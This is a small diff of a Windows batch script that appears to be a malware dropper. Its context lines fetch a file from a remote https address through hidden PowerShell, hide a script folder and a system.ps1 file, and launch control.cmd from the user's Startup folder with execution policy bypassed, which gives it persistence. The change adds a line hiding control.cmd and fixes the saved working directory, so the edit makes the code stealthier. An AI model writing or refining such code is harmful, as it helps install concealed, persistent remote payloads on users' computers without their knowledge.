@@ -1,5 +1,5 @@
 @echo off
-set initial=cd
+set initial=%cd%
 set start_up="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 set name=%username%
 
@@ -12,6 +12,7 @@ powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https:
 attrib +h C:\Users\%name%\script
 attrib +h C:\Users\%name%\script\system.ps1
 cd %start_up%
+attrib +h control.cmd
 start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\control.cmd
 
 cd %initial%
